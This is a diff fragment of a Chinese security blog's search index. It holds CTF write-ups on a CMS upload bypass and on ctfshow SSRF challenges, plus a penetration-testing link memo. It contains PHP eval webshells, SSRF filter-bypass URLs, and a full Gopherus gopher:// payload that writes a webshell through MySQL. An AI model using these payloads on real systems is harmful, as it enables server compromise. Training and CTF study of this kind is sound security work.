+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>扩展名<br>   <span class="hljs-variable">$filetype1</span>=substr(strstr(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;mod&quot;</span>),<span class="hljs-number">4</span>);<br>   <span class="hljs-variable">$filetype2</span>=substr(strrchr(<span class="hljs-variable">$filetype1</span>,<span class="hljs-string">&quot;php&quot;</span>),<span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$filetype2</span>!=<span class="hljs-string">&quot;.mod&quot;</span>)<br>&#123;<br>	printerror(<span class="hljs-string">&quot;LoadInModMustmod&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>特意从官网下了份源码下来，发现这里是改了的。</p>
+<p>将文件命名为mod.php.mod即可绕过。（这样出题完全没意义了，完全脱离实际…）</p>
+<p>内容：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>	<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;3hark.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php @eval(\$_POST[0]);?&gt;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://emoment.top/2023/02/13/2023HSCSEC-CTF/#EZCMS">https://emoment.top/2023/02/13/2023HSCSEC-CTF/#EZCMS</a></p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试备忘录</title>
+    <url>/2023/02/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>这是我在 23 年 2 月 18 日建立的一个渗透测试备忘录，打算记录网上优秀的、精彩的渗透测试方面的文章。</p>
+<span id="more"></span>
+
+<h1 id="windows-渗透测试"><a href="#Windows-渗透测试" class="headerlink" title="Windows 渗透测试"></a>Windows 渗透测试</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于 Windows 和 域安全 推荐一位<a href="https://3gstudent.github.io/archive">大佬</a>的博客，这是一个琢磨渗透技巧的究极狠人。</p>
+<h2 id="0x01-提权"><a href="#0x01-提权" class="headerlink" title="0x01 提权"></a>0x01 提权</h2><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>利用 metasploit 的话可以参考 <a href="https://www.freebuf.com/articles/system/184289.html">freebuf</a> 的这篇即可，写的很详细啦。</p>
+<p>也可以看看<a href="https://xz.aliyun.com/t/8292#toc-5">先知社区</a>的这篇综合一点的内核漏洞提权</p>
+<h3 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h3><p>参考这篇<a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">文章</a>即可，主要是使用 PowerUp 这个集成工具。</p>
+<p>想细致的了解系统服务提权可以看看 Nu1L 写的那本内网渗透体系建设。这本书讲的几个手法都是用到 <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk">accesschk</a> 工具</p>
+<h1 id="linux-渗透测试"><a href="#Linux-渗透测试" class="headerlink" title="Linux 渗透测试"></a>Linux 渗透测试</h1>]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-ssrf</title>
+    <url>/2023/02/20/ctfshow-ssrf/index.html</url>
+    <content><![CDATA[<!--toc-->
+
+<p>今日实操 SSRF</p>
+<span id="more"></span>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于该漏洞相关原理和利用手法推荐 <a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p>
+<h3 id="web-352"><a href="#web-352" class="headerlink" title="web 352"></a>web 352</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>很简单的一个题，我们希望请求服务端本地 web 目录下的 &#x2F;flag.php 文件，但是题目不允许我们输入 localhost 和 127.0.0 ，即这是一个针对特定 ip 地址的过滤，我们可以采用 <strong>0、进制转换</strong>等方式绕过。</p>
+<h3 id="web-353"><a href="#web-353" class="headerlink" title="web 353"></a>web 353</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>和上题一样的思路，进制转换，0 或者 0.0.0.0 都可以拿 flag</p>
+<h3 id="web-354"><a href="#web-354" class="headerlink" title="web 354"></a>web 354</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>这个题目过滤了 数字 0、1、localhost，没办法进制转换绕过了。可以使用 DNS 重绑定的手法。该手法的原理就是修改可控域名的 a记录为 127.0.0.1，之后当服务端向你的域名发起解析请求时就会返回 127.0.0.1，这样你就成功地绕过了服务端不允许访问本地的限制。</p>
+<p>亦或者你可以采用 302 跳转来绕过，如何做呢？</p>
+<p>你可以在自己的网页上写一个php文件，实现的功能是当有人请求网页时会自动跳转到 127.0.0.1</p>
+<p>当服务端向我们的网页发起请求时，它最终就会跳转到本地了。</p>
+<p>示例代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="web-355"><a href="#web-355" class="headerlink" title="web 355"></a>web 355</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>这题对 host 的长度作出了限制，可以直接用 0 或者 127.1 来绕过。</p>
+<h3 id="web-356"><a href="#web-356" class="headerlink" title="web 356"></a>web 356</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">3</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>长度限制到小于 3 了，只能用 0 绕过了。</p>
+<h3 id="web-357"><a href="#web-357" class="headerlink" title="web 357"></a>web 357</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p>调用了一些过滤函数判断是否是合法的 ip，可以使用 302 重定向绕过。</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gethostbyname</span> — 返回主机名对应的 IPv4地址。 <br><span class="hljs-attribute">filter_var</span> — 使用特定的过滤器过滤一个变量<br><span class="hljs-attribute">FILTER_FLAG_IPV4</span> - 要求值是合法的 IPv4 IP（比如 <span class="hljs-number">255.255.255.255</span>）<br><span class="hljs-attribute">FILTER_FLAG_IPV6</span> - 要求值是合法的 IPv6 IP（比如 <span class="hljs-number">2001</span>:<span class="hljs-number">0</span>db8:<span class="hljs-number">85</span>a3:<span class="hljs-number">08</span>d3:<span class="hljs-number">1319</span>:<span class="hljs-number">8</span>a2e:<span class="hljs-number">0370</span>:<span class="hljs-number">7334</span>）<br><span class="hljs-attribute">FILTER_FLAG_NO_PRIV_RANGE</span> - 要求值是 RFC 指定的私域 IP （比如 <span class="hljs-number">192.168.0.1</span>）<br><span class="hljs-attribute">FILTER_FLAG_NO_RES_RANGE</span> - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="web-358"><a href="#web-358" class="headerlink" title="web 358"></a>web 358</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">  <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="分析"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h4><p>可以使用 HTTP基本身份认证绕过，代码要求以 show 结尾，可以用 ?show 或者 #show 来绕过。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>ctf.<span class="hljs-number">12321321</span>@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web-359"><a href="#web-359" class="headerlink" title="web 359"></a>web 359</h3><p>题目是打无密码的mysql</p>
+<h4 id="分析"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h4><p>进入是个登录页面，抓包发现 returl 参数，发现这里存在一个 SSRF 漏洞</p>
+<p><img src="/images/ctfshow-ssrf/image-20230220120224951.png" alt="image-20230220120224951"></p>
+<p>发现读取文件啥的都没回显，应该是要写文件，这时候可以使用 <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> 工具帮助我们进行攻击。</p>
+<p><img src="/images/ctfshow-ssrf/image-20230220120547348.png" alt="image-20230220120547348"></p>
+<p>运行 payload</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">python gopherus<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--exploit</span> mysql<br></code></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Give MySQL username: root                   <br>Give query to execute: select <span class="hljs-string">&#x27;&lt;?php eval($_POST[pass]); ?&gt;&#x27;</span> INTO OUTFILE <span class="hljs-string">&#x27;/var/www/html/2.php&#x27;</span>;<br>gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="web-360"><a href="#web-360" class="headerlink" title="web 360"></a>web 360</h3><p>提示是打 redis</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="分析"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>直接用上题的工具即可。</p>
+<p>ssrf打redis，基本上四种攻击方式：</p>
+<ul>
+<li>写webshell</li>
+<li>写ssh公钥</li>
+<li>写contrab计划任务反弹shell</li>
+<li>主从复制</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
 </search>
